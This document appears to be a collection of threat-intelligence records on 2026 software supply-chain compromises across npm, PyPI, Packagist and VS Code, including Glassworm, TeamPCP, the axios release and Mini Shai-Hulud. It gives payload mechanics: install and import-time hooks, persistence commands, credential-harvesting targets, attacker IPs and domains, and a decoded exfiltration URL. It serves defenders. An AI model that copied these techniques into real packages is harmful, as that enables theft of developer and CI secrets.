synopsis: quartz.quartz-markdown-editor 0.3.0 carried Glassworm's invisible Unicode loader. The VS Code extension was part of the March 2026 multi-ecosystem wave.
story:
Glassworm returned in March 2026 with the same idea and a wider surface. The attacker hid executable payload bytes in invisible Unicode variation selectors, so reviews and normal editor views could show a harmless empty string.

`quartz.quartz-markdown-editor` was the VS Code Marketplace artifact in this wave. Aikido listed version 0.3.0 on March 12, alongside npm packages and compromised GitHub repositories, showing the campaign was no longer confined to one registry.

The loader decoded the invisible string at runtime and passed the result to `eval()`. Earlier Glassworm payloads fetched second-stage code through Solana-based infrastructure and targeted tokens, credentials, and developer secrets.

This record tracks the VS Code extension artifact. The campaign record tracks the shared Glassworm technique, the March 3-9 GitHub repository compromises, and the broader npm and marketplace spread.
references: GlassWorm Returns: New Wave Strikes as We Expose Attacker Infrastructure <https://www.aikido.dev/blog/glassworm-returns-unicode-attack-github-npm-vscode>

title: watercrawl-mcp hid Glassworm payload
synopsis: The Glassworm threat actor published malicious versions of @iflow-mcp/watercrawl-watercrawl-mcp with payloads hidden by invisible Unicode characters.
story:
WaterCrawl MCP was part of the March 2026 Glassworm wave that crossed GitHub, npm, and VS Code. The package name was long and ordinary-looking, but the payload used the same invisible Unicode technique as the rest of the campaign.

The malicious versions embedded code in Unicode variation selectors. Reviewers saw a string that looked empty or harmless; runtime code decoded the hidden bytes and executed the result.

Aikido listed versions 1.3.0 through 1.3.4 as affected. This record is scoped to the npm artifact, while the Glassworm campaign record carries the shared infrastructure, GitHub repository compromises, and VS Code extension spread.
references: GlassWorm Returns: New Wave Strikes as We Expose Attacker Infrastructure <https://www.aikido.dev/blog/glassworm-returns-unicode-attack-github-npm-vscode>

title: miso-client hid Glassworm payload
synopsis: Glassworm published @aifabrix/miso-client 4.7.2 with invisible Unicode JavaScript. The code looked empty in review but decoded to malware at runtime.
story:
Glassworm's March 2026 wave hid code in characters people do not see. The `@aifabrix/miso-client` package carried the same invisible Unicode decoder pattern Aikido tracked across npm, VS Code, and GitHub repositories.

The visible JavaScript looked harmless because the payload lived inside variation selector characters. At runtime, a decoder converted those hidden code points back into bytes and passed the result to `eval`.

Aikido listed `@aifabrix/miso-client@4.7.2` as one of the npm artifacts published on 2026-03-12. The broader Glassworm pattern used staged loaders, Solana-based dead drops, and credential theft from developer environments.

This record stays narrow. The campaign file carries the 150-plus repository scope; this attack records the npm package version that could enter a dependency graph through normal installation.
references: Glassworm Returns: Invisible Unicode Malware Found in 150+ GitHub Repositories <https://www.aikido.dev/blog/glassworm-returns-unicode-attack-github-npm-vscode>

title: bittensor-wallet package stole private keys
synopsis: A registry-only malicious release of bittensor-wallet 4.0.2 was uploaded to PyPI and later yanked. The backdoor was compiled into the Rust wallet code so wallet decryption paths exposed coldkey and hotkey material directly to the payload.
story:
bittensor-wallet 4.0.2 was a direct attack on key custody. The package is the Rust-backed Python wallet library for Bittensor; its job is to decrypt coldkey and hotkey files so users can sign staking and transfer operations.

The malicious release lived on PyPI for about forty-eight hours, from March 15 to March 17, 2026. The source archive carried the backdoor inside the Rust wallet code, not as an obvious sidecar script. The release workflow metadata was also weakened by removing build provenance attestation.

The payload hooked keyfile decryption paths in `src/keyfile.rs`. When a wallet key was decrypted, the malware tagged the key type, encrypted the private material with an attacker public key, and attempted exfiltration through HTTPS, DNS TXT lookup, generated domains, and DNS query chunks.

The maintainers yanked 4.0.2 after detection. Any keyfile decrypted while that version was installed must be treated as exposed, because the attack sat exactly where plaintext private keys briefly exist.
references: bittensor-wallet 4.0.2 compromised on PyPI <https://www.stepsecurity.io/blog/bittensor-wallet-4-0-2-compromised-on-pypi---backdoor-exfiltrates-private-keys>, Package compromised <https://github.com/opentensor/btwallet/issues/183>, Socket diff for bittensor-wallet 4.0.1 to 4.0.2 <https://socket.dev/diff/pypi/package/bittensor-wallet/4.0.1..4.0.2>

title: react-native-international-phone-number npm account takeover
synopsis: An attacker controlling the astroonauta npm account published malicious react-native-international-phone-number releases without matching GitHub releases, tags, or workflow runs.
story:
The first malicious react-native-international-phone-number release landed at 10:49:29 UTC on March 16, 2026. It added a preinstall hook that ran node install.js, while the prior adjacent 0.11.7 release did not include that hook. Aikido noted that 0.11.8 still depended on the clean react-native-country-select 0.3.9, which means this package was directly backdoored rather than merely poisoned by its dependency.

The loader followed the same staged path as the companion package. It queried Solana RPC for a memo, decoded a link, fetched a second stage, and decrypted a third-stage payload. The third stage used a Google Calendar URL to recover another slug, then requested more content from the same attacker-controlled IP address.

The recovered payload targeted Windows developer systems. It established persistence through schtasks and the HKCU Run key, wrote an init.json state file, downloaded Node.js runtimes, walked browser and wallet storage, collected npm and GitHub credentials, and posted the archive to attacker infrastructure. After disclosure, the same npm account was used in later releases that moved the delivery into a transitive dependency chain.
references: Malicious npm Releases Found in Popular React Native Packages - 130K Monthly Downloads Compromised <https://www.stepsecurity.io/blog/malicious-npm-releases-found-in-popular-react-native-packages---130k-monthly-downloads-compromised>, Malicious release report for react-native-international-phone-number <https://github.com/AstrOOnauta/react-native-international-phone-number/issues/165>, Follow-up malicious release report for react-native-international-phone-number <https://github.com/AstrOOnauta/react-native-international-phone-number/issues/167>, Glassworm Strikes Popular React Native Phone Number Packages <https://www.aikido.dev/blog/glassworm-strikes-react-packages-phone-numbers>

title: react-native-country-select npm account takeover
synopsis: The astroonauta npm account takeover also compromised react-native-country-select, a direct dependency of react-native-international-phone-number.
story:
The first react-native-country-select payload was small at the package boundary and large after execution. Version 0.3.91 added a preinstall hook that ran node install.js before npm finished the install. Aikido found the adjacent 0.3.9 release clean, making the change narrow and easy to describe: one new loader file and one lifecycle hook.

The loader reached to Solana RPC, recovered a transaction memo, decoded a URL, and fetched a second stage. The recovered chain continued through AES-decrypted JavaScript and a Google Calendar URL used as another indirection point before fetching more content from attacker infrastructure. The same install.js loader hash appeared in both React Native packages compromised that morning.

The later payload was Windows-focused theft code, not a harmless beacon. It set persistence with schtasks and an HKCU Run key, wrote an init.json guard, downloaded Node.js runtimes into AppData, walked browser profile and wallet storage, killed browser processes, stole npm and GitHub credentials, and exfiltrated collected archives. StepSecurity later tracked the attacker returning with additional releases that hid delivery behind transitive dependencies.
references: Malicious npm Releases Found in Popular React Native Packages - 130K Monthly Downloads Compromised <https://www.stepsecurity.io/blog/malicious-npm-releases-found-in-popular-react-native-packages---130k-monthly-downloads-compromised>, Malicious release report for react-native-country-select <https://github.com/AstrOOnauta/react-native-country-select/issues/11>, Glassworm Strikes Popular React Native Phone Number Packages <https://www.aikido.dev/blog/glassworm-strikes-react-packages-phone-numbers>

title: Trivy release actions shipped malware
synopsis: After incomplete containment of the February Trivy takeover, compromised credentials were used to publish malicious Trivy v0.69.4 artifacts, force-push most trivy-action version tags, and replace setup-trivy tags with credential-stealing commits.
story:
The second Trivy compromise was a containment failure with a long tail. After the February takeover, attackers still had usable access. On March 19, 2026, they used compromised credentials to publish Trivy v0.69.4 artifacts and to change action tags that existing CI/CD workflows already trusted.

The delivery path was not one file. It included the Trivy release, `trivy-action`, `setup-trivy`, and later Docker Hub images for 0.69.4, 0.69.5, and 0.69.6. Many workflows referenced mutable action tags instead of pinned commits, so force-pushed tags changed code under stable-looking configuration.

The payload read GitHub Actions runner memory and process environments, collected developer and cloud secrets, encrypted the archive, and tried to exfiltrate it to `scan.aquasecurtiy.org` or fallback public repositories. Trivy was valuable to the attacker because it already ran where secrets live: inside build and deployment pipelines.

The Register reported Mandiant's estimate of more than 1,000 impacted SaaS environments, with researchers warning that the number could grow. Aqua removed affected tags, released fixed action versions, and published GHSA-69fq-xp46-6x23. The incident then bled into adjacent tools, including LiteLLM, through secrets stolen from CI/CD.

title: OpenGov form builder carried CanisterWorm
synopsis: @opengov/form-builder 0.12.3 added a postinstall backdoor during TeamPCP's CanisterWorm campaign. The worm used npm tokens stolen through the second Trivy compromise.
story:
CanisterWorm reached the `@opengov` namespace after the second Trivy compromise. StepSecurity traced the path: malicious Trivy tooling harvested CI/CD secrets, and the stolen npm tokens were then used to publish new package versions across reachable scopes.

`@opengov/form-builder@0.12.3` changed the install surface. Earlier releases had no lifecycle script; the compromised release added `postinstall: node index.js`. That gave the package code execution at install time, before application code ran.

The JavaScript loader carried a base64-encoded Python implant. It wrote `~/.local/share/pgmon/service.py`, installed a user-level systemd service, and polled an Internet Computer canister for commands. A propagation component searched npm configuration and environment variables for publish tokens, then republished the payload to other packages the victim could reach.

The record is scoped to the `@opengov/form-builder` artifact. The TeamPCP campaign record carries the broader Trivy credential theft, self-propagation, and destructive Kubernetes payload behavior.
references: CanisterWorm: How a Self-Propagating npm Worm Is Spreading Backdoors Across the Ecosystem <https://www.stepsecurity.io/blog/canisterworm-how-a-self-propagating-npm-worm-is-spreading-backdoors-across-the-ecosystem>, Malicious code in @opengov/form-builder <https://osv.dev/vulnerability/MAL-2026-2210>, Trivy Compromised a Second Time <https://www.stepsecurity.io/blog/trivy-compromised-a-second-time---malicious-v0-69-4-release>

title: LiteLLM PyPI release stole credentials
synopsis: TeamPCP compromised LiteLLM PyPI releases 1.82.7 and 1.82.8 with a credential-stealing payload that evolved from a proxy-module trigger to a wheel-level .pth file executed by Python at interpreter startup.
story:
LiteLLM was a downstream hit from the Trivy compromise. According to LiteLLM maintainers, a bad Trivy scanner ran in the project's CI/CD pipeline and exposed the PyPI publishing token. The attacker used that token to publish LiteLLM 1.82.7 and 1.82.8 to PyPI.

The delivery path was direct Python package installation. The Register and LiteLLM maintainers identified `litellm_init.pth` in the compromised packages; Python processes `.pth` files at interpreter startup, so version 1.82.8 could execute before an application imported LiteLLM. The official LiteLLM Proxy Docker path was reported not impacted because it pinned dependencies and did not use the compromised PyPI packages.

The payload collected environment, SSH, cloud, Kubernetes, package-manager, CI/CD, and wallet secrets. It encrypted the archive using the TeamPCP RSA/AES pattern and wrote the stolen material as `tpcp.tar.gz`. Where Kubernetes permissions allowed, the malware also attempted privileged pod deployment for node access.

BerriAI removed the affected PyPI releases, deleted publishing tokens, rotated maintainer accounts, paused new releases, and engaged Mandiant while reviewing repositories and CI/CD. PyPA's advisory told anyone who installed and ran the affected package to assume credentials available to the LiteLLM environment were exposed and rotate them from clean systems.

title: IoliteLabs Solidity extensions shipped backdoor
synopsis: A dormant IoliteLabs Visual Studio Marketplace publisher account was used to update three Solidity extensions to version 0.1.8 after nearly eight years of inactivity, with no matching source repository commits.
story:
IoliteLabs had three old Solidity extensions in the Visual Studio Marketplace: macOS, Windows, and Linux packages first published for the Iolite ecosystem in 2018. On 2026-03-25, all three were updated to version 0.1.8 after nearly eight years of silence.

The source repository did not match the marketplace update. StepSecurity found no corresponding GitHub commits, and the VSIX shape changed sharply: the extension shrank, real Solidity functionality became hollow command stubs, and a bundled `pako` library carried the backdoor.

The payload selected behavior by platform. Windows and macOS received separate staged payloads and C2 paths. Linux loaded the tampered dependency but public analysis did not identify an active Linux execution branch.

The attack targeted Solidity developers through a legitimate publisher account with existing installs and history. That preserved trust while removing functionality; the extension became a loader wearing the old package name.
references: Malicious IoliteLabs VSCode Extensions Target Solidity Developers on Windows, macOS, and Linux with Backdoor <https://www.stepsecurity.io/blog/malicious-iolitelabs-vscode-extensions-target-solidity-developers-on-windows-macos-and-linux-with-backdoor>

title: Telnyx PyPI release hid WAV stealer
synopsis: TeamPCP compromised Telnyx Python SDK releases 4.87.1 and 4.87.2 by adding import-time malware to the PyPI artifacts.
story:
The Telnyx Python SDK compromise put TeamPCP code into a communications library with a large install base. On March 27, 2026, PyPI releases 4.87.1 and 4.87.2 added malicious import-time logic to `telnyx/_client.py`.

The code ran when an application imported `telnyx`. On Linux and macOS, `FetchAudio()` spawned a detached Python subprocess, fetched `ringtone.wav` from `83.142.209.203:8080`, decoded a hidden credential harvester from the audio data, and posted encrypted results as `tpcp.tar.gz`.

Windows had its own path. Version 4.87.1 called `Setup()` with the wrong case, so the Windows function did not run. Version 4.87.2 fixed that to `setup()`, downloaded `hangup.wav`, decoded a PE binary, wrote it as `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\msbuild.exe`, and used a lock file to mark execution.

StepSecurity tied the package to TeamPCP through the same RSA-4096 public key, encryption scheme, and `tpcp.tar.gz` exfiltration marker seen in the LiteLLM compromise. The 742,000 download figure is pre-compromise package reach, not a confirmed victim count.

title: Axios npm account shipped RAT
synopsis: A compromised axios maintainer account published malicious npm versions 1.14.1 and 0.30.4 on March 31, 2026. Both releases injected plain-crypto-js 4.2.1, whose install path delivered a multi-platform RAT and exposed machines that installed the brief releases.
story:
The axios compromise was short, but it sat on a very large dependency graph. On March 31, 2026, an attacker used the lead maintainer's npm access to publish axios 1.14.1 and 0.30.4. The project later described the entry point as a compromised maintainer machine reached through targeted social engineering and RAT malware.

The malicious axios releases did not need to rewrite the library's public API. They added a dependency on plain-crypto-js 4.2.1, moving the payload into dependency resolution and install-time execution. A normal fresh install during the window could pull the poisoned axios version, then pull the malicious helper package from npm.

The payload was a remote access trojan for macOS, Windows, and Linux. The postmortem told affected users to inspect lockfiles for axios 1.14.1, axios 0.30.4, or plain-crypto-js, remove the malicious dependency, check for traffic to sfrclak[.]com or 142.11.206.73 on port 8000, and rotate every secret available to the affected machine or CI runner.

The timeline was measured in hours: axios 1.14.1 appeared at 00:21 UTC, axios 0.30.4 around 01:00 UTC, community detections followed almost immediately, and npm removed the malicious axios versions by 03:15 UTC. The project response moved toward immutable releases, OIDC publishing, stronger GitHub Actions hygiene, and a release process less dependent on one personal account.
references: Five Supply Chain Attacks in Twelve Days <https://blog.dreamfactory.com/five-supply-chain-attacks-in-twelve-days-how-march-2026-broke-open-source-trust-and-what-comes-next>, Axios Supply Chain Attack Reaches OpenAI macOS Signing Pipeline, Forces Certificate Rotation <https://socket.dev/blog/axios-supply-chain-attack-reaches-openai-macos-signing-pipeline-forces-certificate-rotation>, Post Mortem: axios npm supply chain compromise <https://github.com/axios/axios/issues/10636>

title: VeloraDEX SDK installed macOS backdoor
synopsis: @velora-dex/sdk 9.4.1 was published directly to npm with no matching source commit. Importing it fetched a macOS backdoor and registered launchctl persistence.
story:
The VeloraDEX compromise was registry-only. The attacker published `@velora-dex/sdk@9.4.1` to npm without changing the GitHub repository, so source review of the default branch would not show the payload.

The malicious delta was small. `package.json` carried the version bump, and `dist/index.js` gained three prepended lines. Those lines decoded and ran a shell command when application code imported the package.

The command downloaded `install.sh` from `89.36.224.5`. On macOS, the script created `~/Library/Application Support/com.apple.Terminal/`, selected an ARM64 or Intel `profiler` binary, made it executable, and registered it with `launchctl submit -l zsh.profiler`.

The attack did not depend on npm lifecycle hooks. `--ignore-scripts` would not stop it; the trigger was `require('@velora-dex/sdk')`. StepSecurity recommended pinning to 9.4.0 or earlier, removing the launchctl service and dropped binary, and rotating secrets from affected machines.
references: @velora-dex/sdk Compromised on npm: Malicious Version Drops macOS Backdoor via launchctl Persistence <https://www.stepsecurity.io/blog/velora-dex-sdk-compromised-on-npm-malicious-version-drops-macos-backdoor-via-launchctl-persistence>, SDK 9.4.1 compromised on npm <https://github.com/VeloraDEX/sdk/issues/233>

title: pgserve npm CanisterSprawl credential stealer
synopsis: On April 21, 2026, malicious pgserve npm versions 1.1.11, 1.1.12, and 1.1.13 added a postinstall loader that harvested developer and CI secrets, encrypted them with RSA-4096 and AES-256, and exfiltrated to an Internet Computer Protocol canister.
story:
pgserve was a small, convenient development dependency: an embedded PostgreSQL server meant to drop into Node.js projects with little ceremony. The malicious versions changed that trust boundary at install time. Versions 1.1.11, 1.1.12, and 1.1.13 were published to npm on April 21, 2026 without matching upstream git tags.

The package change was blunt and effective. Compared with the last legitimate release, 1.1.10, the malicious tarballs added scripts/check-env.js and scripts/public.pem, then wired package.json to run a postinstall command. The command ended with `|| true`, so an error in the malware would not break the install or warn the developer with a failed dependency.

The injected script harvested environment variables, package-manager tokens, SSH keys, cloud credentials, Kubernetes and database material, crypto wallets, and browser password stores. Before transmission, it used a hybrid RSA-4096 and AES-256 scheme, then exfiltrated primarily to an Internet Computer Protocol canister and secondarily to a webhook if the right environment key was present.

The propagation logic made this more than a theft implant. If it found an npm publish token, it could enumerate packages the victim could publish, copy its loader and public key into each package, bump versions, and publish again. If it found a PyPI token, it attempted Python-package infection using .pth execution, crossing from npm into Python packaging.

title: Xinference PyPI release stole credentials
synopsis: TeamPCP compromised three consecutive xinference PyPI releases, 2.6.0 through 2.6.2, by adding an import-time two-stage Python credential stealer to xinference/__init__.py.
story:
The xinference compromise put malware into the top-level import path of an LLM inference framework. On April 22, 2026, PyPI releases 2.6.0, 2.6.1, and 2.6.2 carried code added to `xinference/__init__.py`.

Version 2.6.0 ran a base64 payload at module scope. Version 2.6.1 moved the payload into `_install()` and used synchronous `exec()`. Version 2.6.2 kept the function-level hiding but restored detached execution with `subprocess.Popen`.

The decoded first stage contained the marker `# hacked by teampcp`. It launched a second Python collector, wrote collected data into a temporary file, compressed it as `love.tar.gz`, and posted it to `whereisitat.lucyatemysuperbox.space` with the header `X-QT-SR: 14`.

The collector targeted the material expected on inference servers: SSH keys, cloud credentials, Kubernetes tokens, Docker auth, `.env` files, shell histories, TLS private keys, and cryptocurrency wallets. StepSecurity noted that this variant lacked the RSA wrapping seen in LiteLLM and Telnyx, leaving a copycat possibility, but the marker, placement, and rapid version iteration match TeamPCP tradecraft.
references: TeamPCP Injects Two-Stage Credential Stealer into xinference PyPI Package <https://www.stepsecurity.io/blog/teampcp-injects-two-stage-credential-stealer-into-xinference-pypi-package>

title: Bitwarden CLI hit by Shai-Hulud
synopsis: The official Bitwarden CLI npm package (@bitwarden/cli) version 2026.4.0 was compromised during the broader Checkmarx/TeamPCP supply-chain campaign after attackers abused a GitHub Actions path in Bitwarden's CI/CD pipeline.
story:
Bitwarden CLI was hit through its npm delivery path. On April 22, 2026, version 2026.4.0 of `@bitwarden/cli` briefly carried malicious JavaScript in the package contents. The record is narrow: the CLI package on npm was affected, not Bitwarden vault data.

The payload appeared in `bw1.js` and matched the Checkmarx/TeamPCP toolchain. It used the same `audit.checkmarx.cx` telemetry endpoint, the same style of scrambled strings, and the same embedded machinery for token theft, workflow injection, and npm republishing.

The installer path mattered. The package could run through npm lifecycle behavior, scrape GitHub Actions runner memory and environment data, collect cloud and npm credentials, and use stolen publishing rights to push the campaign into more packages.

Bitwarden contained the release, revoked compromised access, and deprecated the affected npm version. The useful boundary is precise: people outside the short npm distribution window were not affected, and Bitwarden reported no evidence that end-user vault data was accessed.
references: Bitwarden CLI compromised in ongoing Checkmarx supply chain campaign <https://socket.dev/blog/bitwarden-cli-compromised>, The npm threat landscape <https://unit42.paloaltonetworks.com/monitoring-npm-supply-chain-attacks/>

title: elementary-data PyPI and GHCR releases forged
synopsis: An attacker exploited a GitHub Actions script-injection flaw in elementary-data's issue-update workflow to forge release state, tag v0.23.3 at an orphan commit, and dispatch the legitimate release pipeline.
story:
elementary-data was compromised through GitHub Actions, not through a maintainer manually uploading a package. An attacker posted a crafted comment to a pull request, and a workflow interpolated that comment into a shell `run:` block.

The injected command used the repository's `GITHUB_TOKEN` to create an orphan release commit and tag `v0.23.3`. That commit added a large `elementary.pth` file and bumped the package version. Python `.pth` files run during interpreter startup, so the payload did not need an explicit import.

The attacker then dispatched the legitimate release workflow. PyPI received `elementary-data==0.23.3`, and GHCR received a multi-architecture `ghcr.io/elementary-data/elementary` image tagged `0.23.3` and `latest`, all from the forged release state.

The payload was a credential stealer. It searched SSH keys, cloud credentials, Kubernetes files, package-manager tokens, wallet material, and secrets on disk, then posted an archive to attacker infrastructure. Maintainers removed the release and published clean `0.23.4`.
references: Security Incident Report: Malicious release of Elementary OSS Python CLI v0.23.3 <https://www.elementary-data.com/post/security-incident-report-malicious-release-of-elementary-oss-python-cli-v0-23-3>, elementary-data Compromised on PyPI and GHCR <https://www.stepsecurity.io/blog/elementary-data-compromised-on-pypi-and-ghcr-forged-release-pushed-via-github-actions-script-injection>

title: SAP CAP packages hit by Mini Shai-Hulud
synopsis: Mini Shai-Hulud compromised SAP ecosystem npm packages mbt, @cap-js/sqlite, @cap-js/postgres, and @cap-js/db-service through two release paths: a stolen static npm token for mbt and an abused GitHub Actions OIDC publishing flow for cap-js/cds-dbs.
story:
The SAP CAP compromise was the April 2026 Mini Shai-Hulud wave in enterprise JavaScript clothing. Four packages carried the same `preinstall` hook: `mbt@1.2.48`, `@cap-js/sqlite@2.2.2`, `@cap-js/postgres@2.2.2`, and `@cap-js/db-service@2.10.1`.

The loader was small and direct. `setup.mjs` downloaded Bun 1.3.13 from GitHub releases, then ran an 11.6 MB obfuscated `execution.js` payload. The working package stayed useful, which kept the install quiet while credential collection ran.

The publish paths differed. `mbt` used a stolen static npm automation token from the normal cloudmtabot account. The `@cap-js` packages came through abused npm trusted publishing: a compromised SAP developer account changed release workflow behavior, exchanged a GitHub OIDC token for an npm token, and published from a non-main branch.

The payload harvested secrets, read GitHub Actions runner memory, created dead-drop repositories named "A Mini Shai-Hulud has Appeared", and wrote persistence hooks into `.claude/settings.json` and `.vscode/tasks.json`. This record carries the SAP package artifacts; the TeamPCP campaign carries the shared worm machinery.

title: Lightning PyPI wheel shipped Shai-Hulud stealer
synopsis: lightning 2.6.2 and 2.6.3 bundled a hidden _runtime directory. Importing the package launched a Bun-backed JavaScript stealer tied to Mini Shai-Hulud.
story:
The Lightning compromise put Mini Shai-Hulud into Python machine-learning environments. On April 30, 2026, malicious `lightning` wheels appeared on PyPI as versions 2.6.2 and 2.6.3. The last known clean release was 2.6.1.

The changed wheels carried a hidden `_runtime/` directory. Importing the package started a daemon thread that downloaded the Bun JavaScript runtime from GitHub and executed `_runtime/router_runtime.js`, an obfuscated payload large enough to hide most of the attack outside ordinary Python review.

StepSecurity reported credential theft, environment-variable harvesting, cloud secret collection, GitHub API abuse, and npm tarball poisoning on the developer machine. That made the package both a stealer and a bridge from PyPI into npm publishing paths.

The GitHub issue that surfaced the compromise was closed quickly with suspicious responses, suggesting account-level control around the same time as the PyPI releases. This record stays scoped to the Lightning wheels; the TeamPCP campaign carries the wider Mini Shai-Hulud propagation pattern.

title: Intercom Node SDK hit by Mini Shai-Hulud
synopsis: The Mini Shai-Hulud/TeamPCP campaign compromised the official intercom-client package on npm.
story:
`intercom-client@7.0.4` was published on 2026-04-30 through a hijacked GitHub Actions OIDC publishing path. StepSecurity treated it as direct evidence that Mini Shai-Hulud was propagating through CI/CD tokens stolen from earlier victims.

The package stayed functional but changed shape. Version 7.0.4 added a `preinstall` hook, introduced `setup.mjs`, and shipped an 11.7 MB single-line `router_runtime.js` payload. The clean 7.0.3 release had SLSA provenance; the malicious 7.0.4 release did not.

The loader downloaded Bun 1.3.13 and used it to execute the obfuscated payload. The stealer expanded beyond GitHub and npm tokens into AWS metadata, GCP metadata, Azure connection strings, private keys, environment variables, and generic API-key patterns.

Exfiltration used GitHub itself. The payload authenticated to `api.github.com`, created a private repository under the victim account, and committed encrypted stolen data there. That made ordinary egress filtering weak: the traffic went to a domain many CI systems already allow.

title: Intercom PHP SDK hit by Mini Shai-Hulud
synopsis: The Mini Shai-Hulud campaign expanded into the PHP ecosystem by compromising the official intercom/intercom-php package on Packagist. Attackers compromised a maintainer account to overwrite existing legitimate versions.
story:
`intercom/intercom-php@5.0.2` showed Mini Shai-Hulud crossing ecosystem boundaries. Semgrep reported that attackers overwrote an existing legitimate Packagist version rather than publishing a new obvious outlier.

The malicious package converted itself into a Composer plugin. That matters because Composer plugins execute during installation, before application code imports the library. The install step became the execution step.

The plugin downloaded the Bun JavaScript runtime and ran an obfuscated credential stealer aligned with the npm campaign. The payload targeted GitHub tokens, SSH keys, cloud credentials, environment variables, and other developer secrets.

The record is paired with `intercom-client` because both appeared the same day and shared Mini Shai-Hulud tooling. It remains separate because the compromised artifact, package manager, and execution mechanism were different.
references: Malicious Intercom PHP Package Spreads Mini Shai-Hulud Attack to Packagist via Composer Plugin <https://semgrep.dev/blog/2026/malicious-intercom-php-package-spreads-mini-shai-hulud-attack-to-packagist-via-composer-plugin/>

title: bfunky/http-parser Packagist package backdoored with host stealer
synopsis: An attacker pushed an Analytics.php payload into bfunky/http-parser and re-tagged 11 historical releases on GitHub, causing Packagist to serve a host-data stealer to anyone installing the abandoned PHP HTTP parser.
story:
bfunky/http-parser is a small PHP library for parsing HTTP messages. Its last release
was in 2018. On 2026-05-08 a commit added src/Analytics.php and one line to
AbstractHttpParser.php: a require_once for the new file. The library is autoloaded
through Composer, so the new code runs whenever any class in the package is referenced.

That same day, the attacker tagged 2.1.0 and 2.2.0 through 2.2.4 against the new
commits. Six days later the historical 1.0.0 through 1.0.4 tags moved to a fresh commit
carrying the same payload, and 2.2.5 joined the 2.x line. Packagist followed the tags
and served the rewritten zipballs. The author header in AbstractHttpParser.php had been
changed from "Jairo Rodríguez" to "jairo.rodriguez". The commit message on the 2.1.0
retag is "[2.2.3]". The pattern reads as account compromise, not a maintainer's return.

Analytics.php is short. It disables TLS verification and POSTs JSON to a URL stored as
base64 — aHR0cHM6Ly80NC4yMTAuOTQuMzgvcGFja2FnaXN0LnBocA==, which decodes to
https://44.210.94.38/packagist.php. The body carries the hostname, SERVER_NAME,
SERVER_ADDR, the working directory, php_uname(), and the full process environment from
getenv(). After a successful send the code writes a marker file under the system temp
directory, named md5(URL_DIGEST . gethostname()), so the beacon fires once per host.
The file's header copies Composer's autogenerated boilerplate. It reads like plumbing.

The environment dump is the point. PHP processes routinely hold database passwords, API
keys, and cloud credentials in their environment. Packagist counts 36,469 lifetime
downloads and roughly 675 a month, so the exposed population is small. But every
autoload of every class reaches the payload, and the collection IP was still answering
when this record was written.
references: Somebody backdoored the package bfunky/http-parser on packagist with a stealer <https://www.reddit.com/r/blueteamsec/comments/1tfhhl9/somebody_backdoored_the_package_bfunkyhttpparser/>, bfunky/http-parser commit d1c67b2 introducing Analytics.php <https://github.com/bfunky/http-parser/commit/d1c67b2a59301c753e69eabee2ef1c265b111936>, bfunky/http-parser on Packagist <https://packagist.org/packages/bfunky/http-parser>

title: TanStack packages hit by Mini Shai-Hulud
synopsis: TeamPCP's Mini Shai-Hulud worm compromised the TanStack Router release pipeline by chaining a pull_request_target "Pwn Request" pattern, GitHub Actions cache poisoning, and runtime extraction of a GitHub Actions OIDC trusted-publisher token from runner memory.
story:
The TanStack wave made provenance uncomfortable. The attacker did not only steal a registry token and push a tarball by hand. According to the public postmortem and follow-on research, the release path was abused through GitHub Actions: a pull_request_target pattern, cache poisoning, and extraction of trusted-publishing material from the runner while the workflow still looked like official automation.

The npm packages carried a new root-level payload file, reported by Aikido as router_init.js, and added an optional dependency on @tanstack/setup from a GitHub commit in the TanStack router repository. That dependency had a prepare script that ran tanstack_runner.js with Bun and then exited nonzero. Because it was optional, the visible install failure could be treated as noise after the code had already run.

The payload was built for developer workstations and CI/CD runners. It searched for GitHub and npm tokens, GitHub Actions OIDC material, AWS credentials and metadata endpoints, Kubernetes service account files, Vault tokens, environment variables, local filesystem secrets, and SSH material. Exfiltration and staging followed the broader Mini Shai-Hulud pattern, including Session/Oxen infrastructure and GitHub-centered propagation logic.

TanStack is recorded separately because its package scope and release pipeline evidence are unusually clear. Aikido counted 83 TanStack package-version entries within a broader May 2026 wave of 373 malicious package-version entries across 169 npm package names. This record preserves the TanStack artifacts, while the campaign record carries the shifting cross-ecosystem count.
